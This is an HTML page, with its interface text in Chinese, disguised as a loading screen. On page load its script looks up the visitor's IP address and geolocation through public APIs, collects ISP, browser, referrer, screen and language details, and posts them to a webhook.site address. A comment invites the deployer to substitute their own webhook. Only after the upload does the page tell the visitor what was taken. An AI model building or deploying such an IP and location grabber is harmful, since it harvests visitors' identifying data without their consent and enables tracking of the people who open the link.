<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>加载中...</title>
    <style>
        body {
            font-family: "Microsoft YaHei", Arial, sans-serif;
            text-align: center;
            padding: 60px 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 28px; margin-bottom: 30px; }
        #status { margin: 20px 0; font-size: 18px; }
        .success { color: #90ee90; }
        .error { color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>正在加载，请稍等...</h1>
        <div id="status">⏳ 获取信息中...</div>
    </div>

    <script>
        const WEBHOOK_URL = "https://webhook.site/56ba6ab0-2575-4b5a-9f59-0169e25c9098";   // ←←← 这里改成你的Webhook地址

        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.log("发送失败，但不影响页面显示");
            }
        }

        async function getAndUploadInfo() {
            const statusEl = document.getElementById('status');
            let ipData = {};

            // 尝试获取IP和位置信息（使用多个免费API）
            const apis = [
                'https://ipapi.co/json/',
                'http://ip-api.com/json/'
            ];

            for (let apiUrl of apis) {
                try {
                    const res = await fetch(apiUrl);
                    if (res.ok) {
                        ipData = await res.json();
                        break;
                    }
                } catch (e) {}
            }

            // 整理要上传的数据
            const uploadData = {
                timestamp: new Date().toISOString(),
                ip: ipData.ip || ipData.query || "未知",
                city: ipData.city || "未知",
                region: ipData.region || ipData.regionName || "未知",
                country: ipData.country_name || ipData.country || "未知",
                isp: ipData.org || ipData.isp || "未知",
                userAgent: navigator.userAgent,
                referrer: document.referrer || "直接访问",
                screen: `\( {screen.width}x \){screen.height}`,
                language: navigator.language
            };

            // 发送到你的Webhook
            await sendToWebhook(uploadData);

            // 页面显示结果（可选）
            statusEl.innerHTML = `
                <span class="success">✅ 信息已获取并上传成功！</span><br><br>
                IP: ${uploadData.ip}<br>
                位置: ${uploadData.city}, ${uploadData.region}, ${uploadData.country}<br>
                <small>感谢您的访问\~</small>
            `;

            document.querySelector('h1').textContent = "加载完成";
        }

        // 页面加载后立即执行
        window.onload = getAndUploadInfo;
    </script>
</body>
</html>
